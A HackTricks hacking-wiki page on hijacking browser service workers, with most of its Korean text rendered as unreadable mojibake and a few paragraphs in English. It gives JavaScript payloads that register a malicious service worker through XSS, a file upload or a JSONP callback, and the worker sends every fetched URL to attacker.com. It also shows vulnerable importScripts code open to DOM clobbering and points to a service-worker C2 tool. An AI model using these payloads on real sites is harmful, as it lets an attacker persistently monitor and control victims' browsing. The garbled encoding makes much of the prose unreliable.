# ì„œë¹„ìŠ¤ ì›Œì»¤ ì•…ìš©í•˜ê¸°



{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì„¸ìš”.**

</details>
{% endhint %}

## ê¸°ë³¸ ì •ë³´

**ì„œë¹„ìŠ¤ ì›Œì»¤**ëŠ” ì›¹ í˜ì´ì§€ì™€ ë¶„ë¦¬ë˜ì–´ ë¸Œë¼ìš°ì €ì—ì„œ ë°±ê·¸ë¼ìš´ë“œì—ì„œ ì‹¤í–‰ë˜ëŠ” ìŠ¤í¬ë¦½íŠ¸ë¡œ, ì›¹ í˜ì´ì§€ë‚˜ ì‚¬ìš©ì ìƒí˜¸ì‘ìš©ì´ í•„ìš”í•˜ì§€ ì•Šì€ ê¸°ëŠ¥ì„ ê°€ëŠ¥í•˜ê²Œ í•˜ì—¬ **ì˜¤í”„ë¼ì¸ ë° ë°±ê·¸ë¼ìš´ë“œ ì²˜ë¦¬** ê¸°ëŠ¥ì„ í–¥ìƒì‹œí‚µë‹ˆë‹¤. ì„œë¹„ìŠ¤ ì›Œì»¤ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [ì—¬ê¸°](https://developers.google.com/web/fundamentals/primers/service-workers)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½í•œ ì›¹ ë„ë©”ì¸ ë‚´ì—ì„œ ì„œë¹„ìŠ¤ ì›Œì»¤ë¥¼ ì•…ìš©í•¨ìœ¼ë¡œì¨ ê³µê²©ìëŠ” í•´ë‹¹ ë„ë©”ì¸ ë‚´ì˜ ëª¨ë“  í˜ì´ì§€ì—ì„œ í”¼í•´ìì˜ ìƒí˜¸ì‘ìš©ì„ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.


### ê¸°ì¡´ ì„œë¹„ìŠ¤ ì›Œì»¤ í™•ì¸í•˜ê¸°

ê¸°ì¡´ ì„œë¹„ìŠ¤ ì›Œì»¤ëŠ” **ê°œë°œì ë„êµ¬**ì˜ **ì• í”Œë¦¬ì¼€ì´ì…˜** íƒ­ì˜ **ì„œë¹„ìŠ¤ ì›Œì»¤** ì„¹ì…˜ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜ ë‹¤ë¥¸ ë°©ë²•ì€ [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals)ë¥¼ ë°©ë¬¸í•˜ì—¬ ë” ìì„¸í•œ ì •ë³´ë¥¼ í™•ì¸í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

### í‘¸ì‹œ ì•Œë¦¼

**í‘¸ì‹œ ì•Œë¦¼ ê¶Œí•œ**ì€ **ì„œë¹„ìŠ¤ ì›Œì»¤**ê°€ ì§ì ‘ ì‚¬ìš©ì ìƒí˜¸ì‘ìš© ì—†ì´ ì„œë²„ì™€ í†µì‹ í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ì— ì§ì ‘ì ì¸ ì˜í–¥ì„ ë¯¸ì¹©ë‹ˆë‹¤. ê¶Œí•œì´ ê±°ë¶€ë˜ë©´ ì„œë¹„ìŠ¤ ì›Œì»¤ê°€ ì§€ì†ì ì¸ ìœ„í˜‘ì„ ê°€í•  ê°€ëŠ¥ì„±ì´ ì œí•œë©ë‹ˆë‹¤. ë°˜ëŒ€ë¡œ, ê¶Œí•œì„ ë¶€ì—¬í•˜ë©´ ì ì¬ì ì¸ ì•…ìš©ì„ ìˆ˜ì‹ í•˜ê³  ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ ë˜ì–´ ë³´ì•ˆ ìœ„í—˜ì´ ì¦ê°€í•©ë‹ˆë‹¤.

## ì„œë¹„ìŠ¤ ì›Œì»¤ ìƒì„± ê³µê²©

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ë‹¤ìŒì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤:

* ì„œë²„ì— **ì„ì˜ì˜ JS** íŒŒì¼ì„ **ì—…ë¡œë“œ**í•  ìˆ˜ ìˆëŠ” ë°©ë²•ê³¼ ì—…ë¡œë“œëœ JS íŒŒì¼ì˜ **ì„œë¹„ìŠ¤ ì›Œì»¤ë¥¼ ë¡œë“œí•  ìˆ˜ ìˆëŠ” XSS**
* **ì¶œë ¥ì„ ì¡°ì‘í•  ìˆ˜ ìˆëŠ”** **ì·¨ì•½í•œ JSONP ìš”ì²­**(ì„ì˜ì˜ JS ì½”ë“œë¡œ)ê³¼ **ì•…ì„± ì„œë¹„ìŠ¤ ì›Œì»¤ë¥¼ ë¡œë“œí• ** **í˜ì´ë¡œë“œë¡œ JSONPë¥¼ ë¡œë“œí•  ìˆ˜ ìˆëŠ” XSS**

ë‹¤ìŒ ì˜ˆì œì—ì„œëŠ” `fetch` ì´ë²¤íŠ¸ë¥¼ ìˆ˜ì‹ í•˜ê³  **ê° ê°€ì ¸ì˜¨ URLì„ ê³µê²©ìì˜ ì„œë²„ë¡œ ì „ì†¡í•˜ëŠ”** **ìƒˆ ì„œë¹„ìŠ¤ ì›Œì»¤ë¥¼ ë“±ë¡í•˜ëŠ” ì½”ë“œ**ë¥¼ ì œì‹œí•˜ê² ìŠµë‹ˆë‹¤(ì´ ì½”ë“œëŠ” **ì„œë²„**ì— **ì—…ë¡œë“œ**í•˜ê±°ë‚˜ **ì·¨ì•½í•œ JSONP** ì‘ë‹µì„ í†µí•´ ë¡œë“œí•´ì•¼ í•˜ëŠ” ì½”ë“œì…ë‹ˆë‹¤):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
ê·¸ë¦¬ê³  ì´ê²ƒì€ **ì›Œì»¤ë¥¼ ë“±ë¡í•˜ëŠ”** ì½”ë“œì…ë‹ˆë‹¤ (ë‹¹ì‹ ì´ **XSS**ë¥¼ ì•…ìš©í•˜ì—¬ ì‹¤í–‰í•  ìˆ˜ ìˆì–´ì•¼ í•˜ëŠ” ì½”ë“œ). ì´ ê²½ìš° **GET** ìš”ì²­ì´ **ê³µê²©ìì˜** ì„œë²„ë¡œ ì „ì†¡ë˜ì–´ ì„œë¹„ìŠ¤ ì›Œì»¤ì˜ **ë“±ë¡**ì´ ì„±ê³µí–ˆëŠ”ì§€ ì—¬ë¶€ë¥¼ **ì•Œë¦½ë‹ˆë‹¤**:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
ì·¨ì•½í•œ JSONP ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì•…ìš©í•˜ëŠ” ê²½ìš° `var sw` ì•ˆì— ê°’ì„ ë„£ì–´ì•¼ í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
There is a **C2** dedicated to the **exploitation of Service Workers** called [**Shadow Workers**](https://shadow-workers.github.io) that will be very useful to abuse these vulnerabilities.

The **24-hour cache directive** limits the life of a malicious or compromised **service worker (SW)** to at most 24 hours after an XSS vulnerability fix, assuming online client status. To minimize vulnerability, site operators can lower the SW script's Time-To-Live (TTL). Developers are also advised to create a [**service worker kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) for rapid deactivation.

## Abusing `importScripts` in a SW via DOM Clobbering

The function **`importScripts`** called from a Service Worker can **import a script from a different domain**. If this function is called using a **parameter that an attacker could** modify he would be able to **import a JS script from his domain** and get XSS.

**This even bypasses CSP protections.**

**Example vulnerable code:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### DOM í´ë¡œë²„ë§ì„ ì´ìš©í•œ ê²½ìš°

DOM í´ë¡œë²„ë§ì´ ë¬´ì—‡ì¸ì§€ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

SWê°€ **`importScripts`**ë¥¼ í˜¸ì¶œí•˜ëŠ” URL/ë„ë©”ì¸ì´ **HTML ìš”ì†Œ ë‚´ë¶€ì—** ìˆì„ ê²½ìš°, **DOM í´ë¡œë²„ë§ì„ í†µí•´ ì´ë¥¼ ìˆ˜ì •í•˜ì—¬ SWê°€** **ìì‹ ì˜ ë„ë©”ì¸ì—ì„œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë¡œë“œí•˜ë„ë¡** í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ì™€ ê´€ë ¨ëœ ì˜ˆì‹œëŠ” ì°¸ì¡° ë§í¬ë¥¼ í™•ì¸í•˜ì„¸ìš”.

## ì°¸ì¡°

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
